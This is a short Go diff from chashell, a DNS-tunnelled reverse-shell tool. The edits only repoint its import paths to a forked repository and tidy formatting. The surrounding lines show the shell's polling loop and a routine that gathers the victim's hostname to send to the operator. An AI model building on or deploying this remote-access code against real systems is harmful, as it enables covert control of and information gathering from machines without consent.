@@ -1,8 +1,8 @@
 package transport
 
 import (
-	"github.com/kost/chashell/lib/logging"
-	"github.com/kost/chashell/lib/protocol"
+	"github.com/bhagyashriw777/chashell/lib/logging"
+	"github.com/bhagyashriw777/chashell/lib/protocol"
 	"os"
 	"strings"
 	"time"
@@ -18,14 +18,14 @@ func pollRead(stream DnsStream) {
 		// Sleep, this is a reverse-shell, not a DNS Stress testing tool.
 		time.Sleep(stream.Sleeptime)
 		// Check for data !
-		if ! stream.opened {
+		if !stream.opened {
 			return
 		}
 		poll(stream)
 		loopCounter += 1
 
 		// Send infoPacket each 60 seconds.
-		if loopCounter % 300 == 0 {
+		if loopCounter%300 == 0 {
 			sendInfoPacket(stream)
 		}
 	}
@@ -69,7 +69,7 @@ func poll(stream DnsStream) {
 	}
 }
 
-func sendInfoPacket(stream DnsStream){
+func sendInfoPacket(stream DnsStream) {
 	// Get hostname.
 	name, err := os.Hostname()
 	if err != nil {
